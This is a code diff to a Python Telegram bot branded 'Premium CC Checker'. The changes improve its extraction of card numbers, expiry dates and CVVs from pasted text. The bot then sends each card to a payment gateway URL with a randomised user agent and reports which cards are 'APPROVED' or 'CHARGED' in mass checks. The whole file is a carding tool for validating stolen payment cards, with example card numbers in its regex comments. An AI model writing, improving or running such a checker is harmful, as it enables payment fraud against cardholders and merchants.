@@ -104,19 +104,22 @@ Contact @mhitzxg for
 
     def normalize_card(self, text):
         """
-        Extract and format card details from text with improved pattern matching
+        Improved card extraction with better pattern matching
         """
         if not text:
             return None
             
+        # Remove unwanted characters but keep | / for delimiters
         text = re.sub(r'[^\d|/\s]', ' ', text)
         
-        cc_match = re.search(r'(?:\D|^)(\d{4}\s?\d{4}\s?\d{4}\s?\d{4})(?:\D|$)', text)
+        # Match CC number (13-19 digits)
+        cc_match = re.search(r'(?:\D|^)(\d{13,19})(?:\D|$)', text)
         if not cc_match:
             return None
             
         cc = cc_match.group(1).replace(' ', '')
         
+        # Match expiration (mm/yy or mm/yyyy)
         exp_match = re.search(r'(\d{1,2})[ /|](\d{2,4})', text)
         if not exp_match:
             return None
@@ -124,9 +127,11 @@ Contact @mhitzxg for
         mm = exp_match.group(1).zfill(2)
         yy = exp_match.group(2)
         
+        # Handle 2-digit year
         if len(yy) == 2:
             yy = '20' + yy if int(yy) < 30 else '19' + yy
         
+        # Match CVV (3-4 digits)
         cvv_match = re.search(r'(?:\D|^)(\d{3,4})(?:\D|$)', text[exp_match.end():])
         if not cvv_match:
             cvv_match = re.search(r'(?:cvv|security.?code)\D*(\d{3,4})', text, re.I)
@@ -137,6 +142,56 @@ Contact @mhitzxg for
         
         return f"{cc}|{mm}|{yy}|{cvv}"
 
+    def extract_cards_from_text(self, text):
+        """Extract all valid cards from text with improved patterns"""
+        cards = []
+        lines = text.split('\n')
+        
+        for line in lines:
+            line = line.strip()
+            if not line:
+                continue
+                
+            # Try to normalize the whole line first
+            norm_card = self.normalize_card(line)
+            if norm_card:
+                cards.append(norm_card)
+                if len(cards) >= MAX_CARDS_PER_MCHK:
+                    break
+                continue
+                
+            # If normalization fails, try more aggressive pattern matching
+            patterns = [
+                # Standard format: 4111111111111111|12|2025|123
+                r'(?:\b|^)(\d{13,19})\b[\s|/]*(\d{1,2})\b[\s|/]*(\d{2,4})\b[\s|/]*(\d{3,4})\b',
+                # Format with separators: 4111 1111 1111 1111 12/25 123
+                r'(?:\b|^)(\d{4}\s?\d{4}\s?\d{4}\s?\d{4})\b[\s|/]*(\d{1,2})\b[\s|/]*(\d{2,4})\b[\s|/]*(\d{3,4})\b',
+                # Format with labels: CCNUM: 4034465129749674 CVV: 029 EXP: 09/2033
+                r'(?:cc|card|number)\D*(\d{13,19})\D*(?:exp|date)\D*(\d{1,2})\D*(\d{2,4})\D*(?:cvv|security)\D*(\d{3,4})',
+            ]
+            
+            for pattern in patterns:
+                matches = re.finditer(pattern, line, re.IGNORECASE)
+                for match in matches:
+                    cc = match.group(1).replace(' ', '')
+                    mm = match.group(2).zfill(2)
+                    yy = match.group(3)
+                    cvv = match.group(4)
+                    
+                    if len(yy) == 2:
+                        yy = '20' + yy if int(yy) < 30 else '19' + yy
+                    
+                    card = f"{cc}|{mm}|{yy}|{cvv}"
+                    if card not in cards:
+                        cards.append(card)
+                        if len(cards) >= MAX_CARDS_PER_MCHK:
+                            break
+                
+                if len(cards) >= MAX_CARDS_PER_MCHK:
+                    break
+                    
+        return cards[:MAX_CARDS_PER_MCHK]
+
     def generate_user_agent(self):
         """Generate random user agent"""
         return random.choice([
@@ -145,17 +200,19 @@ Contact @mhitzxg for
         ])
 
     def clean_response(self, text):
-        """Clean response by removing <pre> tags and extra formatting"""
-        # Remove all <pre> tags
-        text = re.sub(r'<\/?pre>', '', text)
-        # Remove any backslashes that might escape characters
+        """Clean response by removing unwanted characters and formatting"""
+        # Remove HTML tags
+        text = re.sub(r'<\/?[^>]+>', '', text)
+        # Remove backslashes
         text = text.replace('\\', '')
+        # Remove forward slashes that aren't part of dates
+        text = re.sub(r'(?<!\d)/(?!\d)', '', text)
         # Remove extra whitespace
-        text = text.strip()
-        return text
+        text = ' '.join(text.split())
+        return text.strip()
 
     def check_card(self, cc_line):
-        """Check card via gateway and return raw response"""
+        """Check card via gateway and return cleaned response"""
         try:
             url = f"{GATEWAY_URL}?lista={cc_line}"
             headers = {"User-Agent": self.generate_user_agent()}
@@ -236,7 +293,7 @@ Contact @mhitzxg for
                     cc_parts = cc.split('|')
                     result = self.check_card(cc)
                     
-                    if any(x in result for x in ["CHARGED", "CVV MATCH", "APPROVED"]):
+                    if any(x in result.lower() for x in ["charged", "cvv match", "approved"]):
                         approved += 1
                         status = "✅ APPROVED ✅"
                     else:
@@ -287,8 +344,9 @@ Contact @mhitzxg for
                     continue
             
             success_rate = (approved/total)*100 if total > 0 else 0
-            try:
-                final_message = f"""
+            
+            # Prepare final message parts
+            stats_part = f"""
 ╔═══════════════════════╗
   🎉 *MASS CHECK COMPLETE* 🎉  
 ╚═══════════════════════╝
@@ -302,45 +360,48 @@ Contact @mhitzxg for
 ⚡ *System Shutdown:* `NORMAL`
 🕒 *Completed at:* {time.strftime('%H:%M:%S')}
 💎 *Thank you for using Premium CC Checker*
-
 ═══════════════════════
 🔍 *Detailed Results:*
-{''.join(results)}
-                """
-                
-                if len(final_message) > 4000:
-                    part1 = final_message[:4000]
-                    part2 = final_message[4000:]
-                    self.bot.edit_message_text(
-                        part1,
-                        chat_id,
-                        status_msg.message_id,
-                        parse_mode='Markdown'
-                    )
-                    self.bot.send_message(
-                        chat_id,
-                        part2,
-                        parse_mode='Markdown'
-                    )
-                else:
+"""
+            
+            results_part = ''.join(results)
+            final_message = stats_part + results_part
+            
+            try:
+                # Telegram has a 4096 character limit per message
+                if len(final_message) <= 4096:
                     self.bot.edit_message_text(
                         final_message,
                         chat_id,
                         status_msg.message_id,
                         parse_mode='Markdown'
                     )
+                else:
+                    # If too long, split into parts but keep stats in first message
+                    remaining_text = results_part
+                    first_message = stats_part + remaining_text[:2000] + "\n... (continued)"
+                    self.bot.edit_message_text(
+                        first_message,
+                        chat_id,
+                        status_msg.message_id,
+                        parse_mode='Markdown'
+                    )
+                    
+                    # Send remaining parts as replies
+                    remaining_text = remaining_text[2000:]
+                    while remaining_text:
+                        part = remaining_text[:4000]
+                        remaining_text = remaining_text[4000:]
+                        self.bot.send_message(
+                            chat_id,
+                            part,
+                            parse_mode='Markdown'
+                        )
             except Exception as e:
                 logger.error(f"Error sending final message: {e}")
                 self.bot.send_message(
                     chat_id,
-                    f"""
-🎉 *MASS CHECK COMPLETE* 🎉
-📈 *Final Statistics:*
-Total Cards: {total}
-Approved: {approved} ({success_rate:.2f}%)
-Declined: {declined}
-{'═══════════════════════\n'.join(results)}
-                    """,
+                    "🎉 *MASS CHECK COMPLETE*\n" + stats_part,
                     parse_mode='Markdown'
                 )
 
@@ -423,28 +484,36 @@ Declined: {declined}
                 result = self.check_card(cc)
                 stop_event.set()
                 
+                # Ensure response doesn't contain problematic characters
+                result = self.clean_response(result)
+                cc_parts = cc.split('|')
+                
                 response_text = f"""
 ╔═══════════════════════╗
   💳 *Card Check Complete* 💳  
 ╚═══════════════════════╝
-🔹 *Card:* `{cc}`
+🔹 *Card:* `{cc_parts[0]}|{cc_parts[1]}|{cc_parts[2]}|{cc_parts[3]}`
 📝 *Response:*
 {result}
 
 🕒 {time.strftime('%Y-%m-%d %H:%M:%S')}
 ⚡ Powered by Premium CC Checker
 """
+                # Escape any Markdown special characters that might cause issues
+                response_text = re.sub(r'([_*\[\]()~`>#+\-=|{}.!])', r'\\\1', response_text)
+                
                 self.bot.edit_message_text(
                     response_text,
                     msg.chat.id,
                     processing_msg.message_id,
-                    parse_mode='Markdown'
+                    parse_mode='MarkdownV2'
                 )
                 
             except Exception as e:
                 stop_event.set()
+                error_msg = f"❌ *System Error* ❌\n\nError: {str(e)}\n\n🛠️ Please try again or contact support"
                 self.bot.edit_message_text(
-                    f"❌ *System Error* ❌\n\nError: {str(e)}\n\n🛠️ Please try again or contact support",
+                    error_msg,
                     msg.chat.id,
                     processing_msg.message_id,
                     parse_mode='Markdown'
@@ -472,42 +541,14 @@ Declined: {declined}
             else:
                 text = msg.reply_to_message.text or ""
 
-            cc_lines = []
-            for line in text.split('\n'):
-                line = line.strip()
-                if not line:
-                    continue
-                    
-                card_matches = re.finditer(
-                    r'(?:\b|^)(\d{13,19})\b[\s|/]*(\d{1,2})\b[\s|/]*(\d{2,4})\b[\s|/]*(\d{3,4})\b',
-                    line
-                )
-                
-                for match in card_matches:
-                    cc = match.group(1)
-                    mm = match.group(2).zfill(2)
-                    yy = match.group(3)
-                    cvv = match.group(4)
-                    
-                    if len(yy) == 2:
-                        yy = '20' + yy if int(yy) < 30 else '19' + yy
-                    
-                    cc_lines.append(f"{cc}|{mm}|{yy}|{cvv}")
-                    if len(cc_lines) >= MAX_CARDS_PER_MCHK:
-                        break
-                
-                if len(cc_lines) < MAX_CARDS_PER_MCHK:
-                    norm = self.normalize_card(line)
-                    if norm and norm not in cc_lines:
-                        cc_lines.append(norm)
-                        if len(cc_lines) >= MAX_CARDS_PER_MCHK:
-                            break
-
+            cc_lines = self.extract_cards_from_text(text)
+            
             if not cc_lines:
                 return self.bot.send_message(response_chat, "❌ No valid cards found.")
 
-            if len(text.splitlines()) > MAX_CARDS_PER_MCHK:
+            if len(cc_lines) > MAX_CARDS_PER_MCHK:
                 self.bot.send_message(response_chat, f"⚠️ Only first {MAX_CARDS_PER_MCHK} cards will be processed")
+                cc_lines = cc_lines[:MAX_CARDS_PER_MCHK]
 
             self.start_mass_check(response_chat, cc_lines)
 
